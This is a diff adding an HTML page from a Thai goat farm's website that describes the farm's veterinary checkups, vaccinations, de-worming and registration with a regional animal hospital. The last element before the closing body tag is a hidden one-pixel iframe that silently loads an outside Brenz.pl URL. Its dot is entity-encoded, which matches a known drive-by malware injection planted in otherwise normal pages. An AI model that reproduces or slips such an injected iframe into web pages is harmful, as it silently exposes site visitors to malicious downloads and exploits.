@@ -1,0 +1,265 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html>
+
+  <head>
+
+    <title>Health Checkups</title>
+
+    <meta name="generator" content="Web Studio, Version 5.0 for Windows Build 22">
+    <meta name="creation-date" content="Tue, 19 Feb, 2013 07:51:25 GMT">
+    <meta name="website-id" content="WSSITE7DC801AE1C352CE0">
+
+    <style type="text/css"> 
+        p {margin-top:0}
+        html{overflow-y:scroll}
+    </style>
+
+    <!--[if lt IE 7]>
+    <style type="text/css">
+    img {behavior: url(iepngfix.htc)}
+    </style>
+    
+    <![endif]-->
+
+    <script defer type="text/javascript" src="user.js"></script>
+
+
+    <script type="text/javascript">
+    function pointconversion() {
+    var patrn = document.getElementById("patrn");
+    if ( screen.deviceXDPI > 100 || patrn.offsetWidth>= 100) {
+      var WSarr=new Array('div','font');
+      var WSj='0';
+      var WSy = document.getElementsByTagName(WSarr[WSj]);
+      while(WSj<='2'){
+        for (var WSi=0;WSi<WSy.length;WSi++) {
+          var strlength =document.getElementsByTagName(WSarr[WSj])[WSi].style.fontSize.length;
+          var pointsorpixels =document.getElementsByTagName(WSarr[WSj])[WSi].style.fontSize.substr(strlength-2,2);
+          if (pointsorpixels=="pt")
+          {
+            var newsize=Math.ceil(parseFloat(document.getElementsByTagName(WSarr[WSj])[WSi].style.fontSize)*1.3);
+            document.getElementsByTagName(WSarr[WSj])[WSi].style.fontSize = newsize + "px";
+          }
+        }
+        WSj++;
+        WSy = document.getElementsByTagName(WSarr[WSj]);
+      }
+    }
+  }
+</script>
+<script type="text/javascript">
+  <!--
+    window.onerror = null;
+
+  //-->
+</script>
+
+    <script type="text/javascript">
+      <!--
+          if (document.images) {
+          Image0 = new Image(); Image0.src ="Health_Checkups/imag001A.gif"
+          Image1 = new Image(); Image1.src ="Health_Checkups/imag001B.gif"
+          Image2 = new Image(); Image2.src ="Health_Checkups/imag001B.gif"
+          Image3 = new Image(); Image3.src ="Health_Checkups/imag002A.gif"
+          Image4 = new Image(); Image4.src ="Health_Checkups/imag002B.gif"
+          Image5 = new Image(); Image5.src ="Health_Checkups/imag002B.gif"
+          Image6 = new Image(); Image6.src ="Health_Checkups/imag003A.gif"
+          Image7 = new Image(); Image7.src ="Health_Checkups/imag003B.gif"
+          Image8 = new Image(); Image8.src ="Health_Checkups/imag003B.gif"
+          Image9 = new Image(); Image9.src ="Health_Checkups/imag004A.gif"
+          Image10 = new Image(); Image10.src ="Health_Checkups/imag004B.gif"
+          Image11 = new Image(); Image11.src ="Health_Checkups/imag004B.gif"
+          Image12 = new Image(); Image12.src ="Health_Checkups/imag005A.gif"
+          Image13 = new Image(); Image13.src ="Health_Checkups/imag005B.gif"
+          Image14 = new Image(); Image14.src ="Health_Checkups/imag005B.gif"
+          Image15 = new Image(); Image15.src ="Health_Checkups/imag006A.gif"
+          Image16 = new Image(); Image16.src ="Health_Checkups/imag006B.gif"
+          Image17 = new Image(); Image17.src ="Health_Checkups/imag006B.gif"
+          Image18 = new Image(); Image18.src ="Health_Checkups/imag007A.gif"
+          Image19 = new Image(); Image19.src ="Health_Checkups/imag007B.gif"
+          Image20 = new Image(); Image20.src ="Health_Checkups/imag007B.gif"
+          Image21 = new Image(); Image21.src ="Health_Checkups/imag008A.gif"
+          Image22 = new Image(); Image22.src ="Health_Checkups/imag008B.gif"
+          Image23 = new Image(); Image23.src ="Health_Checkups/imag008B.gif"
+          Image24 = new Image(); Image24.src ="Health_Checkups/imag009A.gif"
+          Image25 = new Image(); Image25.src ="Health_Checkups/imag009B.gif"
+          Image26 = new Image(); Image26.src ="Health_Checkups/imag009B.gif"
+          }
+          -->
+          </SCRIPT>
+
+<style type="text/css">
+  <!--
+      a:link { text-decoration:none; color: red;}
+      a:visited { text-decoration:none; color: #878787;}
+      a:hover { text-decoration:none; color: #ff8057;}
+  -->
+</style>
+
+
+</head>
+
+<body background="Health_Checkups/imag000.gif" style="margin:0 0 1px 0; height:100%">
+
+  <table width="972" border="0" cellpadding="0" cellspacing="0" align="center">
+    <tr>
+      <td>
+        <div id="ctrdiv" style="position:absolute; top:0; padding: 0px; height:100%; width: 972px">
+
+          <div id="TXTOBJ7DD1418637B1A51" style=" position:absolute; top:284px; left:102px; width:306px; height:26px;  z-index:2;">
+            <DIV style="BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Arial; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #000080; FONT-SIZE: 10pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              <FONT style="FONT-SIZE: 16pt" color=#0000ff face="Arial Black"><STRONG>Health Checkups</STRONG></FONT></DIV>
+          </div>
+
+
+          <div id="TXTOBJ7DD1418C3792420" style=" position:absolute; top:306px; left:86px; width:326px; height:21px;  z-index:3;">
+            <DIV style="BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Arial Black; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #0000ff; FONT-SIZE: 10pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              <FONT style="FONT-SIZE: 12pt" color=#ff0000 face="Arial Black"><FONT style="FONT-SIZE: 12pt">***********************</FONT></FONT></DIV>
+          </div>
+
+
+          <div id="TXTOBJ7DD1418C39232E1" style=" position:absolute; top:340px; left:58px; width:349px; height:167px;  z-index:4;">
+            <DIV style="BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Arial; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #0000ff; FONT-SIZE: 10pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              <FONT style="FONT-SIZE: 10pt" color=#000000 face="Arial Black"><STRONG>There is a stationed veteran team including a veteran doctor to look after the medical requirements of the farm goats. There are regular round ups through all the rest houses to assure the health of each and every goat. All the goats are given their dosages of PPR and FMD on required intervals. Apart from this every day the goats are given Calcium syrups to strengthen their bones and digestive tonics to keep their system clean. De-worming is also very essential so it is done after short intervals under doctors' assistance. All the other medical treatment is done at the farm as well since all the major required medicines are stocked and stored here.</STRONG></FONT></DIV>
+          </div>
+
+
+          <div id="TXTOBJ7DD1418C3BF2131" style=" position:absolute; top:510px; left:57px; width:349px; height:77px;  z-index:5;">
+            <DIV style="BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Arial; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #000000; FONT-SIZE: 10pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              <FONT style="FONT-SIZE: 10pt" face="Arial Black"><STRONG>S.A.M Goat Farm is also registered at the regional animal hospital from where we get the feedback for medication of the goat or any sort of epidemic illness in the goats. Full medical attention and extra care is given to the goats for the best health and to maintain their beauty.</STRONG></FONT></DIV>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:1px; width:37px; height:18px;  z-index:6;">
+            <a href="index.html" name="#Homepage">
+              <img src="Health_Checkups/imag001.gif" width=37 height=18 border=0 name="imag001"
+               onmouseover='imag001.src="Health_Checkups/imag001A.gif"'
+               onmousedown='imag001.src="Health_Checkups/imag001B.gif"'
+               onmouseout='imag001.src="Health_Checkups/imag001.gif"'
+               onmouseup='imag001.src="Health_Checkups/imag001A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:41px; width:48px; height:18px;  z-index:7;">
+            <a href="Breeds.html" name="#Breeds">
+              <img src="Health_Checkups/imag002.gif" width=48 height=18 border=0 name="imag002"
+               onmouseover='imag002.src="Health_Checkups/imag002A.gif"'
+               onmousedown='imag002.src="Health_Checkups/imag002B.gif"'
+               onmouseout='imag002.src="Health_Checkups/imag002.gif"'
+               onmouseup='imag002.src="Health_Checkups/imag002A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:92px; width:52px; height:18px;  z-index:8;">
+            <a href="Feeding.html" name="#Feeding">
+              <img src="Health_Checkups/imag003.gif" width=52 height=18 border=0 name="imag003"
+               onmouseover='imag003.src="Health_Checkups/imag003A.gif"'
+               onmousedown='imag003.src="Health_Checkups/imag003B.gif"'
+               onmouseout='imag003.src="Health_Checkups/imag003.gif"'
+               onmouseup='imag003.src="Health_Checkups/imag003A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:147px; width:87px; height:18px;  z-index:9;">
+            <a href="Infrastructure.html" name="#Infrastructure">
+              <img src="Health_Checkups/imag004.gif" width=87 height=18 border=0 name="imag004"
+               onmouseover='imag004.src="Health_Checkups/imag004A.gif"'
+               onmousedown='imag004.src="Health_Checkups/imag004B.gif"'
+               onmouseout='imag004.src="Health_Checkups/imag004.gif"'
+               onmouseup='imag004.src="Health_Checkups/imag004A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:237px; width:61px; height:18px;  z-index:10;">
+            <a href="Grooming.html" name="#Grooming">
+              <img src="Health_Checkups/imag005.gif" width=61 height=18 border=0 name="imag005"
+               onmouseover='imag005.src="Health_Checkups/imag005A.gif"'
+               onmousedown='imag005.src="Health_Checkups/imag005B.gif"'
+               onmouseout='imag005.src="Health_Checkups/imag005.gif"'
+               onmouseup='imag005.src="Health_Checkups/imag005A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:301px; width:102px; height:18px;  z-index:11;">
+            <a href="Health_Checkups.html" name="#Health Checkups">
+              <img src="Health_Checkups/imag006.gif" width=102 height=18 border=0 name="imag006"
+               onmouseover='imag006.src="Health_Checkups/imag006A.gif"'
+               onmousedown='imag006.src="Health_Checkups/imag006B.gif"'
+               onmouseout='imag006.src="Health_Checkups/imag006.gif"'
+               onmouseup='imag006.src="Health_Checkups/imag006A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:406px; width:154px; height:18px;  z-index:12;">
+            <a href="Nursery_for_New_born_Kids.html" name="#Nursery for New born Kids">
+              <img src="Health_Checkups/imag007.gif" width=154 height=18 border=0 name="imag007"
+               onmouseover='imag007.src="Health_Checkups/imag007A.gif"'
+               onmousedown='imag007.src="Health_Checkups/imag007B.gif"'
+               onmouseout='imag007.src="Health_Checkups/imag007.gif"'
+               onmouseup='imag007.src="Health_Checkups/imag007A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:563px; width:160px; height:18px;  z-index:13;">
+            <a href="New_Born_Feeding_and_care.html" name="#New Born Feeding and care">
+              <img src="Health_Checkups/imag008.gif" width=160 height=18 border=0 name="imag008"
+               onmouseover='imag008.src="Health_Checkups/imag008A.gif"'
+               onmousedown='imag008.src="Health_Checkups/imag008B.gif"'
+               onmouseout='imag008.src="Health_Checkups/imag008.gif"'
+               onmouseup='imag008.src="Health_Checkups/imag008A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="RBHOBJ7DD1418219B6D2" style=" position:absolute; top:211px; left:726px; width:210px; height:18px;  z-index:14;">
+            <a href="Health_and_sanitation_of_the_pr.html" name="#Health and sanitation of the premises">
+              <img src="Health_Checkups/imag009.gif" width=210 height=18 border=0 name="imag009"
+               onmouseover='imag009.src="Health_Checkups/imag009A.gif"'
+               onmousedown='imag009.src="Health_Checkups/imag009B.gif"'
+               onmouseout='imag009.src="Health_Checkups/imag009.gif"'
+               onmouseup='imag009.src="Health_Checkups/imag009A.gif"'>
+            </a>
+          </div>
+
+
+          <div id="SGROBJ7D515701F3030A1" style=" position:absolute; top:1131px; left:0px; width:935px; height:54px;  z-index:15;">
+            <img src="Health_Checkups/imag010.jpg" width=935 height=54 border=0 alt="">
+          </div>
+
+
+          <div id="TXTOBJ7DD221361A94E0" style=" position:absolute; top:1145px; left:268px; width:373px; height:18px;  z-index:16;">
+            <DIV style="BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Berlin Sans FB Demi; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #a0ffff; FONT-SIZE: 10pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              Copyright <FONT style="FONT-SIZE: 10pt" face=Georgia><STRONG><EM>@&nbsp;S.A.M FARM THAILAND</EM></STRONG></FONT>&nbsp;2013/2014</DIV>
+          </div>
+
+
+          <div id="SGROBJ7DD2213722192031" style=" position:absolute; top:0px; left:0px; width:935px; height:183px;  z-index:17;">
+            <img src="Health_Checkups/imag011.jpg" width=935 height=183 border=0 alt="">
+          </div>
+
+
+          <div id="TXTOBJ7DD22137313A36B0" style=" position:absolute; top:184px; left:1px; width:991px; height:16px;  z-index:18;">
+            <DIV style="TEXT-ALIGN: left; BORDER-RIGHT-WIDTH: 0px; BACKGROUND-COLOR: transparent; MARGIN: 1px; FONT-FAMILY: Tahoma; BORDER-TOP-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; COLOR: #000080; FONT-SIZE: 8pt; BORDER-LEFT-WIDTH: 0px" link=#ff0000>
+              <P>
+                <FONT style="FONT-SIZE: 11pt"><FONT style="FONT-SIZE: 12pt"><FONT style="FONT-SIZE: 14pt"><FONT color=#0000c0><FONT style="FONT-SIZE: 10pt"><FONT face=Tahoma><FONT style="FONT-SIZE: 9pt"><FONT style="FONT-SIZE: 8pt">&#3648;&#3621;&#3586;&#3607;&#3637;&#3656; 197 &#3627;&#3617;&#3641;&#3656;7 &#3610;&#3657;&#3634;&#3609;&#3627;&#3657;&#3623;&#3618;&#3626;&#3633;&#3605;&#3623;&#3660;&#3651;&#3627;&#3597;&#3656; &#3605;.&#3611;&#3656;&#3634;&#3648;&#3604;&#3655;&#3591; &#3629;.&#3649;&#3585;&#3656;&#3591;&#3585;&#3619;&#3632;&#3592;&#3634;&#3609; &#3592;.&#3651;&#3614;&#3594;&#3619;&#3610;&#3640;&#3619;&#3637;</FONT><STRONG><EM>&nbsp;</EM><A href="http://www.samfarmthaind.com">&nbsp;&nbsp; &nbsp;&nbsp;<FONT style="FONT-SIZE: 8pt" color=#0000c0><A href="http://www.samfarmthailand.com">www.samfarmthailand.com</STRONG></FONT></FONT></FONT></A><FONT face=Tahoma>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT style="FONT-SIZE: 10pt"><FONT style="FONT-SIZE: 8pt" color=#0000c0>197</A> Moo 7, T. Huay Yai Kaeng Krachan district,&nbsp; Deng forest<FONT style="FONT-SIZE: 8pt" color=#0000c0>&nbsp;,&nbsp;</FONT></FONT></FONT><FONT style="FONT-SIZE: 8pt" color=#0000c0>Phetchaburi<EM>&nbsp;&nbsp;&nbsp; </FONT></FONT></FONT></EM></FONT></P>
+              </FONT></FONT></FONT></DIV>
+          </div>
+
+        </div>
+      </td>
+    </tr>
+  </table>
+    <div style="visibility:hidden;position:absolute;left:0;top:0;z-index:19;"><span style="font-size:10pt;font-family:Arial,Sans-Serif;" id="patrn">aaaaaaaaaaaaiii</span> </div>
+    <script type="text/javascript">pointconversion();</script>
+  <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
+
+</html>
